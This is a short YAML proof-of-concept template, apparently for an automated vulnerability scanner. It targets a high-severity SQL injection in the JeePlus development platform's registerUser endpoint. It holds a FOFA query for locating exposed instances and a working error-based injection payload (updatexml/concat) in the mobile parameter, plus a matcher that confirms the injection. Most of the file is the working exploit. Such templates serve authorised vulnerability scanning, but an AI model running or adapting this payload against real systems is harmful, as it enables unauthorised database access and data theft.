id: poc-yaml-jeeplus-registeruser-sqli
info:
  name: JeePlus快速开发平台 registerUser SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  - 两高一弱
  finger: JeePlus快速开发平台
  fofa: app="JeePlus"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: GET
  path: /a/sys/register/registerUser?roleName=wangba&mobile=13300990099'and+(updatexml(1,concat(0x7e,(select+md5({{.t1}})),0x7e),1))%23&randomCode=2131&loginName=test1&password=123123&confirmNewPassword=123123&ck1=on
  expression: status_code == 500 && contains(body,"XPATH syntax error") && contains(body,"Error
    querying database") && contains(body,substr(t2,0,31))
transport: http
